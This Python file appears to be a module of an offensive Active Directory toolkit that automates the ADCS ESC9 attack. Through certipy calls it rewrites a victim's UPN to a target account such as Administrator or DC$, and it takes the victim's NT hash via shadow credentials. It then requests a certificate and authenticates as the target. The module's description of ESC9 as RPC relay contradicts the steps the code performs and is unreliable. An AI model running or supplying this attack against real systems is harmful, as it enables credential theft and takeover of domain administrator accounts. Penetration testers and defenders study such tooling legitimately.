import os

from module import BaseModule
from tool import Tool

class ADCSESC9(BaseModule):
    name = "ADCS - ESC9"
    path = "adcs/esc9"
    description = "ESC9: No Security Extension on Certificate Template"

    info = """A certificate template has the CT_FLAG_NO_SECURITY_EXTENSION flag set, meaning the resulting certificate request does not need to be signed. This allows an attacker to relay NTLM authentication to the Certificate Authority RPC interface (not HTTP) to request a certificate.

Prerequisites:
  - A template has the CT_FLAG_NO_SECURITY_EXTENSION flag set.
  - The attacker has enrollment rights on that template.
  - The attacker can coerce authentication and relay it to the RPC interface of the CA."""

    options = {
        "ca_host": {"default": "", "description": "ADCS CA Server IP or host address", "required": True},
        "ca_name": {"default": "", "description": "ADCS CA Name", "required": True},
        "dc_ip": {"default": "", "description": "DC IP or host address. If empty, domain will be used.", "required": False},
        "template": {"default": "User", "description": "ESC9 vulnerable template", "required": True},
        "victim": {"default": "", "description": "Username that the attacker can modify the UPN for", "required": True},
        "target_account": {"default": "Administrator", "description": "Account to attempt to compromise (this can be the DC$)", "required": False},
        "domain": {"default": "", "description": "Auth: Domain name (FQDN)", "required": True},
        "username": {"default": "", "description": "Auth: Username", "required": True},
        "password": {"default": "", "description": "Auth: Password or NT Hash (for NTLM auth only)", "required": False},
        "auth": {"default": "ntlm", "description": "Auth: Type (ntlm, krb)", "required": True},
    }

    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)

    async def run(self):
        if not self.validate_options():
            return

        os.chdir(self.logs_dir)
        tool = Tool(self)
        if not tool.set_auth(from_module=True):
            return

        self.opts.target_account = self.opts.target_account.lower()
        pfx = self.uniq_filename(self.opts.target_account)

        tool.title("Read Target User UPN")
        if not await tool.certipy_account('read', ['-user', self.opts.victim]):
            return

        target_upn = tool.upn

        if not tool.upn:
            return

        self.pane_b.write(f"[green][*] Found upn: {tool.upn}[/green]")

        tool.title("Update the victim account's UPN to the target account's")
        if not await tool.certipy_account('update', ['-user', self.opts.victim, '-upn', self.opts.target_account]):
            return

        tool.title("Obtain credentials for the victim account")
        if not await tool.certipy_shadow(self.opts.victim):
            return

        if not tool.nthash:
            return

        self.pane_b.write(f"[green][*] Found NT Hash: {tool.nthash}[/green]")

        if not tool.set_auth(auth="ntlm", domain=self.opts.domain, username=self.opts.victim, password=tool.nthash):
            return
        tool.title("Request a certificate as the victim user")
        if not await tool.certipy_req(['-template', self.opts.template, '-out', pfx]):
            return

        tool.title("Rollback UPN Modification")
        if not tool.set_auth(from_module=True):
            return
        if not await tool.certipy_account('update', ['-user', self.opts.victim, '-upn', target_upn]):
            return

        tool.title("Authenticate as the target user with the obtained certificate")
        if not await tool.certipy_auth(pfx, ['-no-save']):
            return

        self.pane_b.write("[bold green][*] Attack successful.[/bold green]")
